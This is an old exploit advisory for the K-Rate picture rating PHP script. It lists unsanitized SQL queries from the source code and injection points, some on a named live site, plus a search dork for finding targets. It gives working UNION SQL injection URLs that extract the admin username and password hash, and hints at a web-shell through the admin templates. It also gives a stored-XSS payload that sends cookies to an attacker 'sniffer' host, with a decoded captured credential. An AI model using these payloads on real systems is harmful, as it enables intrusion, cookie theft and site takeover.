<html><head><title>K-Rate (SQL/XSS) Multiple Remote Vulnerabilities</title></head><pre>================================================================================
|| K-Rate SQL-INJECTION, XSS                          
================================================================================

Application: K-Rate
------------

Website: http://turn-k.net/k-rate
--------

Demo: http://kratedemo.com
-----

Version: All
--------

About: K-Rate picture rating script. Price 115$.
------

Googledork: Powered by K-Rate
-----------

Date: 01-07-2008
-----

Description:
------------

1) SQL-injection
2) Active XSS
3) Passive XSS


[ SOME VULNERABLE CODE ]


[ admin/includes/dele_cpac.php ] 

$result = mysql_query(&quot;SELECT * FROM $admtable WHERE a_id=$id&quot;) or die (mysql_error());


[payments/payment_received.php]

$res = mysql_query(&quot;SELECT * FROM $paytable WHERE p_id=$ord[order_id]&quot;) or die(mysql_error());


[includes/functions.php]

function id_to_url($id) {
        global $linktable;
        $result = mysql_query(&quot;SELECT l_url FROM $linktable WHERE l_id=$id&quot;) or die(mysql_error());
	 ...

if (mysql_affected_rows() == 0) {
$r = mysql_query(&quot;SELECT l_cat FROM $linktable WHERE l_id=$id&quot;);


[modules/chat.php]

if ($act == 'users') {
$res = sql_query(&quot;SELECT * FROM $chatonlinetable LEFT JOIN $membtable ON $membtable.m_id=$chatonlinetable.co_user WHERE co_room=$room ORDER BY co_user ASC&quot;);


[ SQL-INJECTION ]

*) http://host/index.php?req=online&amp;show=1[SQL]
*) http://host/room/1[SQL]
*) http://raterally.com/index.php?req=view&amp;user=somegirl&amp;id=2[SQL]&amp;act=vote&amp;image=3&amp;voter=12&amp;vote=3
*) http://raterally.com/index.php?req=view&amp;user=somegirl&amp;id=2&amp;act=vote&amp;image=3[SQL]&amp;voter=12&amp;vote=3
*) http://raterally.com/blog/somegirl[SQL]
*) http://raterally.com/index.php?req=blog_edit&amp;id=1[SQL]

and other other other...

===&gt;&gt;&gt; Exploit:

Must be authenticated as a regular user.

http://host/index.php?req=blog_edit&amp;id=-1 union select 1,2,version(),4,5,6/*

http://host/room/-1 union select 1,version(),3,4/*

http://host/index.php?req=blog_edit&amp;id=-1 union select 1,2,adm_user,4,5,6 from rate_admins where adm_id=1/* 

http://host/index.php?req=blog_edit&amp;id=-1 union select 1,2,adm_pass,4,5,6 from rate_admins where adm_id=1/*   

/* Admin Login -  http://host/admin 

Manage Templates =&gt; web-shell */

[ ACTIVE XSS ]

*) in blog
*) in gallery
*) in forum

===&gt;&gt;&gt; Exploit:

&lt;script&gt;img = new Image(); img.src = &quot;http://sniffer/sniff.jpg?&quot;+document.cookie;&lt;/script&gt;

In sniff-log: 
YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9

Decode:

&lt;?php
echo base64_decode(&quot;YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9=&quot;);
?&gt;

Login and password (MD5):

a:2:{s:4:\&quot;user\&quot;;s:6:\&quot;corwin\&quot;;s:4:\&quot;pass\&quot;;s:32:\&quot;1e8ec5930a88992e802cd1bae6c059cf\&quot;;}

[ PASSIVE XSS  :)  ]

http://host/index.php?req=view&amp;user=somegirl&amp;id=2&amp;act=vote&amp;image=3&amp;voter=12&amp;vote=3[XSS]

and other other bugz ...


Author: Corwin
-------                                     
	
Contact: corwin88[dog]mail[dot]ru
--------

# milw0rm.com [2008-08-26]</pre></html>